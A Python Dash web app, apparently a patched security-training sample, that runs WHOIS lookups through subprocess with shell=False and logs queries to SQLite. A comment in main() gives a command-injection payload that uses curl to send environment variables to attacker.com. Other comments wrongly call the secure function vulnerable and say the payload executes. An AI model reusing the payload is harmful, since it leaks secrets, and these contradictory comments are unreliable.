import os
import sqlite3
import logging
import subprocess
import dash
from dash import dcc, html, Input, Output, State
from datetime import datetime

# Configure logging for the DevOps Metrics Dashboard
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - OpsDashboard - %(levelname)s - %(message)s'
)
logger = logging.getLogger("DevOpsDash")

DB_FILE = "dashboard_audit.db"

def init_audit_db():
    """Initializes the SQLite database to track administrative queries."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE query_audit (
            query_id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            query_type TEXT NOT NULL,
            target TEXT NOT NULL,
            execution_status TEXT NOT NULL,
            result_length INTEGER
        )
    ''')
    
    # Insert mock audit history
    mock_history = [
        ('WHOIS', 'example.com', 'SUCCESS', 1543),
        ('WHOIS', 'internal.local', 'FAILED', 0)
    ]
    cursor.executemany('''
        INSERT INTO query_audit (query_type, target, execution_status, result_length)
        VALUES (?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("Dashboard audit database initialized.")

def log_audit_record(query_type: str, target: str, status: str, result_length: int):
    """Records dashboard queries for compliance purposes."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO query_audit (query_type, target, execution_status, result_length) VALUES (?, ?, ?, ?)",
            (query_type, target, status, result_length)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to write audit log: {e}")

def execute_whois_lookup(domain: str) -> str:
    """
    SECURE: Uses a command list and shell=False to prevent Command Injection.
    """
    logger.info(f"Executing secure WHOIS lookup for domain: {domain}")
    
    # Commands are defined as lists of arguments. This removes shell chaining (&&, |)
    # and ensures the domain is passed directly as a single argument to the whois executable.
    command_args = [
        "whois", 
        domain
    ]
    
    try:
        logger.debug(f"Executing secure system command: {command_args}")
        
        process = subprocess.Popen(
            command_args,
            shell=False,  # Explicitly disabled for security
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate(timeout=15)
        
        if process.returncode == 0:
            logger.info("WHOIS query executed successfully.")
            log_audit_record("WHOIS", domain, "SUCCESS", len(stdout))
            return stdout
        else:
            logger.warning(f"WHOIS query failed or no results found.")
            log_audit_record("WHOIS", domain, "FAILED", 0)
            # Masking raw stderr in failure cases to prevent leaking system information to the UI
            return "Error executing WHOIS: Domain not found or query failed."
            
    except subprocess.TimeoutExpired:
        logger.error("WHOIS query timed out.")
        log_audit_record("WHOIS", domain, "TIMEOUT", 0)
        return "Error: Query timed out."
    except FileNotFoundError as e:
        logger.error(f"WHOIS binary not found: {e}")
        log_audit_record("WHOIS", domain, "ERROR", 0)
        return "Internal Error: WHOIS utility not found in environment."
    except Exception as e:
        logger.error(f"System error during WHOIS query: {e}")
        log_audit_record("WHOIS", domain, "ERROR", 0)
        return "Internal Error: System error during query execution."
# Initialize the Dash web application
app = dash.Dash(__name__, title="DevOps NetTools")

# Define the application layout
app.layout = html.Div([
    html.H1("DevOps Network Diagnostics"),
    html.P("Enter a domain name to retrieve its WHOIS registration records."),
    
    html.Div([
        dcc.Input(
            id='domain-input', 
            type='text', 
            placeholder='e.g., example.com',
            style={'width': '300px', 'marginRight': '10px'}
        ),
        html.Button('Run WHOIS', id='submit-button', n_clicks=0)
    ], style={'marginBottom': '20px'}),
    
    html.Div([
        html.H3("Query Results:"),
        html.Pre(
            id='query-output',
            style={
                'backgroundColor': '#f4f4f4',
                'padding': '15px',
                'border': '1px solid #ccc',
                'minHeight': '200px',
                'whiteSpace': 'pre-wrap'
            }
        )
    ])
], style={'fontFamily': 'Arial, sans-serif', 'padding': '40px'})

@app.callback(
    Output('query-output', 'children'),
    Input('submit-button', 'n_clicks'),
    State('domain-input', 'value')
)
def update_output(n_clicks, domain_value):
    """Dash callback triggered when the user clicks the submit button."""
    if n_clicks > 0 and domain_value:
        # Pass the untrusted value from the Dash State directly to the vulnerable function
        result = execute_whois_lookup(domain_value)
        return result
    return "Waiting for input..."

def main():
    """Starts the Dash application server."""
    init_audit_db()
    logger.info("Starting DevOps Network Diagnostics Dashboard on http://127.0.0.1:8050")
    
    # Example Exploitation via the Dash UI:
    # A user types the following into the text input box and clicks 'Run WHOIS':
    #    example.com; curl http://attacker.com/exfiltrate -d "$(env)"
    # This payload is sent via Dash's internal API to the update_output callback and executed.
    
    app.run_server(debug=False, host='127.0.0.1', port=8050)

if __name__ == '__main__':
    main()
